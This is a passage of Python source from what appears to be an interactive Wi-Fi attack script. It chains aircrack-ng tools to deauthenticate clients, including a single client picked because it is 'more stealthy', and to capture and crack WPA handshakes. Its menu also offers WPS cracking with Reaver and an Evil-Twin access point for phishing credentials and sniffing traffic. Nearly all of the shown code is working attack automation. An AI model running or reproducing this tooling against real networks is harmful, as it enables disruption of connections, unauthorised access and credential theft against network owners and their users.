                            bashRun("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/aireplay-ng -0 %s -a %s %s --ignore-negative-one && ~/.airscriptNG/air/*/src/airodump-ng --output-format pcap -w %s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                            crackCapturedHandshake()
                        def no_deauth():
                            clearTerm()
                            print("\n\033[1;37;48m[info] \033[1;39;48mYou have chosen not to disconnect anyone.")
                            print("\033[1;33;48m[info] \033[1;39;48mYou need to wait for someone to connect.")
                            input("\n\033[1;36;48m[info] \033[0;33;48mREADY? HIT \033[1;32;48m[ENTER]\033[0;33;48m TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW.\033[1;31;48m ~# \033[0;39;48m" %(d))
                            bashRun("\niwconfig %s channel %s" %(index,c))
                            bashRun("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/airodump-ng --output-format pcap -w %s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                            crackCapturedHandshake()
                        def sta():
                            bashRun("gnome-terminal --command='bash -c \"~/.airscriptNG/air/*/src/airodump-ng --bssid %s -c %s --ignore-negative-one %s\"' 2>/dev/null &" %(d,c,index))
                            global g
                            print("\n\033[0;37;48m[info] \033[1;33;48mIn the \033[1;32;48mTERMINAL\033[1;33;48m that appears, look at the column where it says bssid/station.")
                            print("\033[1;34;48m[info] \033[0;36;48mYou can choose a station address to de-auth/disconnect a specific client rather than all devices on the network")
                            print("\033[1;34;48m[info] \033[0;35;48mThis is more stealthy as only one device is being disconnected.")
                            g = input("\n\033[1;33;48m[?] \033[0;32;48mPlease copy/paste a station address and hit enter.\033[1;31;48m ~# \033[0;39;48m")
                            bashRun("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                            bashRun("kill $(ps a | grep -i \"airodump-ng --bssid\" | awk -F ' ' {'print $1'}) 2>/dev/null")
                            g = str(g)
                        if e.lower().startswith("n"):
                            no_deauth()
                        elif e.lower().startswith("a"):
                            broadcast_deauth()
                        elif e.lower().startswith("c"):
                            sta()
                            standard()
                    else:
                        input("\033[1;37;40m[-] \033[0;37;48mYou missed something, try again. \n\033[1;33;48m[press enter]\033[1;31;48m ~# \033[0;39;48m")
                        functions.cleanupScript(index)
                        aircrackMenu()
                aircrackMenu()
            except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
                functions.silentCleanupScript(None)
                try:
                    functions.cleanupScript(index)
                except(UnboundLocalError):
                    print('\n')
                    functions.menuOrExit()
#Define the main menu, where user will be presented with options and function of script.
def mainMenu():
    try:
        clearTerm()
        if os.getuid() != 0 or ioStream('ls ~/') != ioStream('ls /root/'):
            print("\033[1;33;48m[?] \033[0;39;48mPlease make sure you have followed the steps:\n" )
            print("\t%s->%s [%si%s] Became the root user with '%ssudo su%s' (%sdoing sudo %s won't work%s)" %(col.okb,col.endl,col.okb,col.endl,col.fail,col.endl,col.warn,sys.argv[0],col.endl))
            print("\t%s->%s [%si%s] As root user, made script executable with '%schmod +x %s%s' " %(col.okb,col.endl,col.okb,col.endl,col.fail,sys.argv[0],col.endl))
            print("\t%s->%s [%si%s] As root user, ran it from bash or python with '%s%s%s' \n" %(col.okb,col.endl,col.okb,col.endl,col.fail,scriptInvocation,col.endl))
            os._exit(1)
        print("Hello %s%s%s!\n" %(col.warn,userName,col.endl))
        if len(sys.argv) >= 1:
            #if sys.argv[1].lower().startswith(('-v','--v','',' ')):
            displayWarranty() #These lines may be made optional to view on a future version.
        print("%sYour CPU%s: %s%s%s" %(col.fail,col.endl,col.okg,cpuModel,col.endl))
        print("%sYour OS%s: %s%s%s" %(col.fail,col.endl,col.okg,userDistro,col.endl))
        if len(sys.argv) >= 1:
            #if sys.argv[1].lower().startswith(('-v','--v','',' ')):
            print("%sYour Kernel%s: %s%s%s" %(col.fail,col.endl,col.okg,userKernel,col.endl)) #These lines may be made optional to view on a future version.
            print("%sYour Architecture%s: %s%s\\%s%s" %(col.fail,col.endl,col.okg,userArch,userArchDpkg.upper(),col.endl)) #These lines may be made optional to view on a future version.
            print("%sDependencies%s: %s%s%s" %(col.fail,col.endl,col.okg,dependenciesInstalled,col.endl)) #These lines may be made optional to view on a future version.
        print("%sScript version%s: %s%s%s" %(col.fail,col.endl,col.okg,scriptVersion,col.endl))
        #A 2d list spanning across multiple lines that stores all the info for the menu.
        #Probably not the most efficient solution here, but its simple to maintain.
        menuTextItemArray = \
    [[col.head_deep,'Aircrack-ng to crack WPA/WPA2','1','main.aircrackng'],
    [col.blue_deep,'Reaver with pixie dust to crack WPS (rare vulnerability)','2','main.reaver'],
    [col.endl_deep,'Host a Evil-Twin/MITM AP to phish credentials, sniff traffic and more.','3','main.EvilTwinFakeAP'],
    [col.fail_deep,'Crack an existing WPA/WPA2 handshake using CPU/GPU.','4','main.crackCaptureFile'],
    [col.yel_deep,'Update/upgrade all system packages and this script','5','functions.updateAptPackagesFull'],
    [col.green_deep,'Setup Hashcat and the OpenCL driver to use GPU for cracking','6','functions.hashcatDownloadFunction'],
    [col.light_blue,'If you used option [8] and terminal broke, use this to fix','7','main.functionRemoveAlias'],
    [col.head_deep,'Add an alias to invoke from anywhere','8','main.createAlias'],
    [col.black_deep,'Add the Kali-Rolling Sources and install any dependancies','9','functions.installKaliSources'],
    [col.endl_deep,'If you used option [9] and APT broke, use this to fix it','10','functions.revertKaliSources'],
    [col.highlight+'\n','Exit \033[0m'+col.endl,'99','functions.silentExit']]
        #The menu, in short.
        print("\n%s[?] %sWhat tool would you like to use? Please run as root." %(col.yel_deep,col.endl))
        print("\n\033[1;33;48m-----------------------------------------ATTACKS-----------------------------------------\033[0;39;48m\n")
        for i in range(1,int(menuTextItemArray[-2][2])+2):
            print("%sType [%s] - %s" %(menuTextItemArray[i-1][0],menuTextItemArray[i-1][2],menuTextItemArray[i-1][1]))
            if i == 4:
                print("\n\033[1;32;48m----------------------------------------DOWNLOADS----------------------------------------\033[0;39;48m\n")
            if i == 6:
                print("\n\033[1;34;48m--------------------------------------INSTALLATIONS--------------------------------------\033[0;39;48m\n")
        while True:
            mainMenuChoice = input('\n|%sMENU%s|(Choose an option) >>' %(col.fail,col.endl))
            for n in menuTextItemArray:
                if mainMenuChoice == n[2]:
                    functionLocation = n[3].split(".")[1]
                    if n[3].split(".")[0] == 'main':
                        getattr(main,functionLocation)()
                    elif n[3].split(".")[0] == 'functions':
                        getattr(functions,functionLocation)()
            mainMenu()
    except(KeyboardInterrupt,EOFError):
        try:
            mainMenu()
        except(KeyboardInterrupt,EOFError):
            mainMenu()
mainMenu()
# Tested Ok -> functions.getAvailableWifiCards()
# Tested OK -> main.EvilTwinFakeAP()

